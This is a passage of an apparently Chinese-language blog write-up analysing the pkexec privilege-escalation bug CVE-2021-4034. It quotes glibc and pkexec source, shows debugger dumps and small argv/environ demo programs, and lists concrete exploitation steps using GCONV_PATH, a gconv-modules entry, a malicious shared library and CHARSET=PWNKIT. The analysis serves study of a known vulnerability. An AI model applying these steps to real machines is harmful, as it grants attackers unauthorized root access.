class="type">const</span> <span class="type">char</span> unsecure_envvars[] =</span><br><span class="line">	UNSECURE_ENVVARS</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> EXTRA_UNSECURE_ENVVARS</span></span><br><span class="line">	EXTRA_UNSECURE_ENVVARS</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	;</span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *cp = unsecure_envvars;</span><br><span class="line">      <span class="comment">// 清除不安全的环境变量</span></span><br><span class="line">      <span class="keyword">while</span> (cp &lt; unsecure_envvars + <span class="built_in">sizeof</span> (unsecure_envvars))</span><br><span class="line">	&#123;</span><br><span class="line">	  __unsetenv (cp);</span><br><span class="line">	  cp = (<span class="type">const</span> <span class="type">char</span> *) __rawmemchr (cp, <span class="string">&#x27;\0&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !HAVE_TUNABLES</span></span><br><span class="line">      <span class="keyword">if</span> (__access (<span class="string">&quot;/etc/suid-debug&quot;</span>, F_OK) != <span class="number">0</span>)</span><br><span class="line">	__unsetenv (<span class="string">&quot;MALLOC_CHECK_&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_PLATFORM_INIT</span></span><br><span class="line">  DL_PLATFORM_INIT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_OSVERSION_INIT</span></span><br><span class="line">  DL_OSVERSION_INIT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Now determine the length of the platform string.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_dl_platform != <span class="literal">NULL</span>)</span><br><span class="line">    _dl_platformlen = <span class="built_in">strlen</span> (_dl_platform);</span><br><span class="line">  <span class="comment">/* Scan for a program header telling us the stack is nonexecutable.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_dl_phdr != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint_fast16_t</span> i = <span class="number">0</span>; i &lt; _dl_phnum; ++i)</span><br><span class="line">      <span class="keyword">if</span> (_dl_phdr[i].p_type == PT_GNU_STACK)</span><br><span class="line">	&#123;</span><br><span class="line">	  _dl_stack_flags = _dl_phdr[i].p_flags;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_SYSINFO_IMPLEMENTATION</span></span><br><span class="line">DL_SYSINFO_IMPLEMENTATION</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ENABLE_STATIC_PIE</span></span><br><span class="line"><span class="comment">/* Since relocation to hidden _dl_main_map causes relocation overflow on</span></span><br><span class="line"><span class="comment">   aarch64, a function is used to get the address of _dl_main_map.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span> *</span><br><span class="line">_dl_get_dl_main_map (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> &amp;_dl_main_map;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>而<code>UNSECURE_ENVVARS</code>的变量是定义在glibc-2.27&#x2F;sysdeps&#x2F;generic&#x2F;unsecvars.h : 10</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> !HAVE_TUNABLES</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GLIBC_TUNABLES_ENVVAR <span class="string">&quot;GLIBC_TUNABLES\0&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GLIBC_TUNABLES_ENVVAR</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Environment variable to be removed for SUID programs.  The names are</span></span><br><span class="line"><span class="comment">   all stuffed in a single string which means they have to be terminated</span></span><br><span class="line"><span class="comment">   with a &#x27;\0&#x27; explicitly.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSECURE_ENVVARS \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;GCONV_PATH\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;GETCONF_DIR\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  GLIBC_TUNABLES_ENVVAR							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;HOSTALIASES\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_AUDIT\0&quot;</span>								      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_DEBUG\0&quot;</span>								      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_DEBUG_OUTPUT\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_DYNAMIC_WEAK\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_HWCAP_MASK\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_LIBRARY_PATH\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_ORIGIN_PATH\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_PRELOAD\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_PROFILE\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_SHOW_AUXV\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LD_USE_LOAD_BIAS\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LOCALDOMAIN\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;LOCPATH\0&quot;</span>								      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;MALLOC_TRACE\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;NIS_PATH\0&quot;</span>								      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;NLSPATH\0&quot;</span>								      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;RESOLV_HOST_CONF\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;RES_OPTIONS\0&quot;</span>							      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;TMPDIR\0&quot;</span>								      \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;TZDIR\0&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>当检测程序是特权文件的时候，会清空上面的环境变量<br>所以不能直接当环境变量传入<br>但这次我们有一次任意写机会<br>需要劫持环境变量引入我们的恶意库</p>
<h3 id="劫持环境变量"><a href="#劫持环境变量" class="headerlink" title="劫持环境变量"></a>劫持环境变量</h3><p>利用的环境变量是<code>GCONV_PATH</code><br><a target="_blank" rel="noopener" href="https://trganda.github.io/posts/iconv/">https://trganda.github.io/posts/iconv/</a></p>
<blockquote>
<p>In <a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/manual/html_node/Generic-Conversion-Interface.html">glib</a>, a module named iconv support convert a charset to another. And the conversion was implemented in such dynamic library (gconv module) which implement pre-request <a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.4%20iconv%20module%20interfaces">interface</a>, the usage of these gconv module were defined in a configuration file with name gconv-modules.</p>
</blockquote>
<ul>
<li><code>iconv</code> 转换字符集</li>
<li><code>iconv</code>是在一个动态库<code>gconv module</code></li>
<li>动态库<code>gconv module</code>定义在配置文件夹<code>gconv-modules</code>里</li>
<li>会调用这个文件夹<code>gconv-modules</code>下的<code>so</code>文件中的<code>gconv()</code>和<code>gconv_init()</code></li>
</ul>
<p>The default <code>gconv module</code> and <code>gconv module configuration</code> file was located in:</p>
<ul>
<li>&#x2F;usr&#x2F;lib&#x2F;gconv: Usual default gconv module path.</li>
<li>&#x2F;usr&#x2F;lib&#x2F;gconv&#x2F;gconv-modules: Usual system default gconv module configuration file.</li>
<li>&#x2F;usr&#x2F;lib&#x2F;gconv&#x2F;gconv-modules.cache: Usual system gconv module configuration cache</li>
</ul>
<p>可以看看iconv的help</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/Desktop/cve/CVE-2021-4034/poc$ iconv --help</span><br><span class="line">Usage: iconv [OPTION...] [FILE...]</span><br><span class="line">Convert encoding of given files from one encoding to another.</span><br><span class="line"></span><br><span class="line"> Input/Output format specification:</span><br><span class="line">  -f, --from-code=NAME       encoding of original text</span><br><span class="line">  -t, --to-code=NAME         encoding for output</span><br><span class="line"></span><br><span class="line"> Information:</span><br><span class="line">  -l, --list                 list all known coded character sets</span><br><span class="line"></span><br><span class="line"> Output control:</span><br><span class="line">  -c                         omit invalid characters from output</span><br><span class="line">  -o, --output=FILE          output file</span><br><span class="line">  -s, --silent               suppress warnings</span><br><span class="line">      --verbose              print progress information</span><br><span class="line"></span><br><span class="line">  -?, --help                 Give this help list</span><br><span class="line">      --usage                Give a short usage message</span><br><span class="line">  -V, --version              Print program version</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f UTF-8 -t UTF-16 &lt; input file &gt; output file</span><br></pre></td></tr></table></figure>

<p><code>iconv</code>会调用<code>iconv_open()</code>而<code>iconv_open()</code>依赖环境变量<code>GCONV_PATH</code></p>
<blockquote>
<p>The iconv support extension the charset conversion ability by user defined gconv module. When use iconv or call iconv() function, it must first allocate a conversion descriptor using <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man3/iconv_open.3.html">iconv_open()</a>. The operation of this function will influence by the enviroment GCONV_PATH</p>
</blockquote>
<p><em><strong>此处应该有源码，之后补</strong></em><br>用<code>GCONV_PATH</code>指定自定义模块去替换系统模块<br>所以利用方法如下</p>
<blockquote>
<p>Suppose we can control the content of enviroment GCONV_PATH, provide a gconv module configuration file and gconv module with evil code. The evil code may be execute for some case.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.1%20Format%20of%20gconv-modules%20files">gconv格式</a></p>
<h3 id="关于argv和environ"><a href="#关于argv和environ" class="headerlink" title="关于argv和environ"></a>关于argv和environ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">environ</span></span><br><span class="line">00:0000│ rdx 0x7fffffffe018 —▸ 0x7fffffffe374 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">01:0008│     0x7fffffffe020 —▸ 0x7fffffffe384 ◂— &#x27;SESSION_MANAGER=local/squ-virtual-machine:@/tmp/.ICE-unix/1566,unix/squ-virtual-machine:/tmp/.ICE-unix/1566&#x27;</span><br><span class="line">02:0010│     0x7fffffffe028 —▸ 0x7fffffffe3f0 ◂— &#x27;QT_ACCESSIBILITY=1&#x27;</span><br><span class="line">03:0018│     0x7fffffffe030 —▸ 0x7fffffffe403 ◂— &#x27;COLORTERM=truecolor&#x27;</span><br><span class="line">04:0020│     0x7fffffffe038 —▸ 0x7fffffffe417 ◂— &#x27;XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg&#x27;</span><br><span class="line">05:0028│     0x7fffffffe040 —▸ 0x7fffffffe444 ◂— &#x27;XDG_MENU_PREFIX=gnome-&#x27;</span><br><span class="line">06:0030│     0x7fffffffe048 —▸ 0x7fffffffe45b ◂— &#x27;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&#x27;</span><br><span class="line">07:0038│     0x7fffffffe050 —▸ 0x7fffffffe487 ◂— &#x27;LC_ADDRESS=zh_CN.UTF-8&#x27;</span><br><span class="line">08:0040│     0x7fffffffe058 —▸ 0x7fffffffe49e ◂— &#x27;GNOME_SHELL_SESSION_MODE=ubuntu&#x27;</span><br><span class="line">09:0048│     0x7fffffffe060 —▸ 0x7fffffffe4be ◂— &#x27;LC_NAME=zh_CN.UTF-8&#x27;</span><br><span class="line">0a:0050│     0x7fffffffe068 —▸ 0x7fffffffe4d2 ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">0b:0058│     0x7fffffffe070 —▸ 0x7fffffffe4fb ◂— &#x27;XMODIFIERS=@im=ibus&#x27;</span><br><span class="line">0c:0060│     0x7fffffffe078 —▸ 0x7fffffffe50f ◂— &#x27;DESKTOP_SESSION=ubuntu&#x27;</span><br><span class="line">0d:0068│     0x7fffffffe080 —▸ 0x7fffffffe526 ◂— &#x27;LC_MONETARY=zh_CN.UTF-8&#x27;</span><br><span class="line">0e:0070│     0x7fffffffe088 —▸ 0x7fffffffe53e ◂— &#x27;SSH_AGENT_PID=1528&#x27;</span><br><span class="line">0f:0078│     0x7fffffffe090 —▸ 0x7fffffffe551 ◂— &#x27;GTK_MODULES=gail:atk-bridge&#x27;</span><br><span class="line">10:0080│     0x7fffffffe098 —▸ 0x7fffffffe56d ◂— &#x27;PWD=/home/squ/Desktop&#x27;</span><br><span class="line">11:0088│     0x7fffffffe0a0 —▸ 0x7fffffffe583 ◂— &#x27;XDG_SESSION_DESKTOP=ubuntu&#x27;</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">argv</span></span><br><span class="line">00:0000│ rsi 0x7fffffffe008 —▸ 0x7fffffffe35c ◂— &#x27;/home/squ/Desktop/a.out&#x27;</span><br><span class="line">01:0008│     0x7fffffffe010 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p><code>argv</code>的第一个参数是自己的绝对路径，第二个参数是<code>NULL</code></p>
<h4 id="execve-c"><a href="#execve-c" class="headerlink" title="execve.c"></a>execve.c</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> argv[] = &#123;</span><br><span class="line">        <span class="string">&quot;AAAA1111&quot;</span>,</span><br><span class="line">        <span class="string">&quot;BBBB2222&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CCCC3333&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> envp[] = &#123;</span><br><span class="line">        <span class="string">&quot;DDDD3333&quot;</span>,</span><br><span class="line">        <span class="string">&quot;EEEE4444&quot;</span>,</span><br><span class="line">        <span class="string">&quot;FFFF5555&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">execve</span>(<span class="string">&quot;./test&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="test-c"><a href="#test-c" class="headerlink" title="test.c"></a>test.c</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argc: %d\n&quot;</span>, argc);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argv[i]!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: %s\n&quot;</span>, i, argv[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: NULL\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-<span class="keyword">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class="line">argc: <span class="number">3</span></span><br><span class="line">argv[<span class="number">0</span>]: AAAA1111</span><br><span class="line">argv[<span class="number">1</span>]: BBBB2222</span><br><span class="line">argv[<span class="number">2</span>]: CCCC3333</span><br><span class="line">argv[<span class="number">3</span>]: <span class="literal">NULL</span></span><br><span class="line">argv[<span class="number">4</span>]: DDDD3333</span><br><span class="line">argv[<span class="number">5</span>]: EEEE4444</span><br><span class="line">argv[<span class="number">6</span>]: FFFF5555</span><br><span class="line">argv[<span class="number">7</span>]: <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>

<p>argc是自动计算的</p>
<h4 id="agrv不传入的情况？"><a href="#agrv不传入的情况？" class="headerlink" title="agrv不传入的情况？"></a>agrv不传入的情况？</h4><p>修改为<code>char* const argv[] = &#123;NULL&#125;</code><br>就没有argc了，而<code>argv[1]</code>是<code>environ[0]</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-<span class="keyword">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class="line">argc: <span class="number">0</span></span><br><span class="line">argv[<span class="number">0</span>]: <span class="literal">NULL</span></span><br><span class="line">argv[<span class="number">1</span>]: DDDD3333</span><br><span class="line">argv[<span class="number">2</span>]: EEEE4444</span><br><span class="line">argv[<span class="number">3</span>]: FFFF5555</span><br><span class="line">argv[<span class="number">4</span>]: <span class="function"><span class="literal">NULL</span></span></span><br><span class="line"><span class="function">Segmentation <span class="title">fault</span> <span class="params">(core dumped)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="关于调用iconv的办法"><a href="#关于调用iconv的办法" class="headerlink" title="关于调用iconv的办法"></a>关于调用iconv的办法</h3><p>如果劫持了<code>GCONV_PATH</code>就需要调用<code>iconv()</code>才行，在<code>pkexec.c</code>源码369行位置</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> gboolean</span></span><br><span class="line"><span class="function"><span class="title">validate_environment_variable</span> <span class="params">(<span class="type">const</span> gchar *key,</span></span></span><br><span class="line"><span class="params"><span class="function">                               <span class="type">const</span> gchar *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  gboolean ret;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Generally we bail if any environment variable value contains</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   *   - &#x27;/&#x27; characters</span></span><br><span class="line"><span class="comment">   *   - &#x27;%&#x27; characters</span></span><br><span class="line"><span class="comment">   *   - &#x27;..&#x27; substrings</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">g_return_val_if_fail</span> (key != <span class="literal">NULL</span>, FALSE);</span><br><span class="line">  <span class="built_in">g_return_val_if_fail</span> (value != <span class="literal">NULL</span>, FALSE);</span><br><span class="line"></span><br><span class="line">  ret = FALSE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* special case $SHELL */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">g_strcmp0</span> (key, <span class="string">&quot;SHELL&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* check if it&#x27;s in /etc/shells */</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">is_valid_shell</span> (value))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">log_message</span> (LOG_CRIT, TRUE,</span><br><span class="line">                       <span class="string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class="line">          <span class="built_in">g_printerr</span> (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="built_in">g_strcmp0</span> (key, <span class="string">&quot;XAUTHORITY&quot;</span>) != <span class="number">0</span> &amp;&amp; <span class="built_in">strstr</span> (value, <span class="string">&quot;/&quot;</span>) != <span class="literal">NULL</span>) ||</span><br><span class="line">           <span class="built_in">strstr</span> (value, <span class="string">&quot;%&quot;</span>) != <span class="literal">NULL</span> ||</span><br><span class="line">           <span class="built_in">strstr</span> (value, <span class="string">&quot;..&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">log_message</span> (LOG_CRIT, TRUE,</span><br><span class="line">                   <span class="string">&quot;The value for environment variable %s contains suscipious content&quot;</span>,</span><br><span class="line">                   key);</span><br><span class="line">      <span class="built_in">g_printerr</span> (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                  <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ret = TRUE;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">g_strcmp0</span> (key, <span class="string">&quot;SHELL&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* check if it&#x27;s in /etc/shells */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">is_valid_shell</span> (value)) <span class="comment">// SHELL值不合法 调用g_printerr</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">log_message</span> (LOG_CRIT, TRUE,</span><br><span class="line">                     <span class="string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class="line">        <span class="built_in">g_printerr</span> (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                    <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>如果构造了一个错误的<code>SHELL</code>环境变量，就会调用<code>g_printerr</code>（当然也可以利用<code>XAUTHORITY</code>来打）<br>而<code>g_printerr</code>默认是<code>UTF-8</code>格式，他会检查<code>CHARSET</code>变量，对输出格式进行转码，就会调用<code>iconv</code>，然后<code>iconv</code>会调用<code>iconv_open</code>初始化，<code>iconv_open</code>会根据<code>GCONV_PATH</code>找到<code>gconv-modules</code>文件，再根据<code>gconv-modules</code>文件的指示找到参数对应字符集的so库，调用so库中的<code>gconv()</code>和<code>gonv_init()</code>函数。</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><ol>
<li>创建一个<code>GCONV_PATH=.</code>的目录</li>
<li>在上面目录下创建我们的恶意库</li>
<li>在本目录下创建<code>gconv-modules</code>文件，写入<code>module UTF-8// PWNKIT// pwnkit 1</code></li>
<li>设置环境变量<ol>
<li>第一个是恶意库<code>pwnkit.so:.</code></li>
<li>第二个环境变量 <code>PATH=GCONV_PATH=.</code>这样 <code>g_find_program_in_path</code> 函数组合出的路径就是<code>GCONV_PATH=./pwnkit.so:.</code> （<code>PATH</code>+<code>NAME</code>&#x3D;<code>GCONV_PATH=.</code>+<code>/</code>+<code>pwnkit.so:.</code>）</li>
<li><code>CHARSET=PWNKIT</code>，指定字符集为<code>pwnkit</code></li>
</ol>
</li>
</ol>
<blockquote>
<p>如环境变量“PATH&#x3D;name”，如果name目录存在，并且name目录下也有value可执行程序，那么envp[0]的便指向name&#x2F;value；<br>如环境变量设置为“PATH&#x3D;name&#x3D;.”，并且“name&#x3D;.”目录下也有value可执行程序，那么envp[0]的便指向“name&#x3D;.&#x2F;value”。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argv[n] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  argv[n] = path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对环境变量的回写</p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
<li>execve执行pkexec，无参传入，造成越界错误执行<code>environ[0]</code></li>
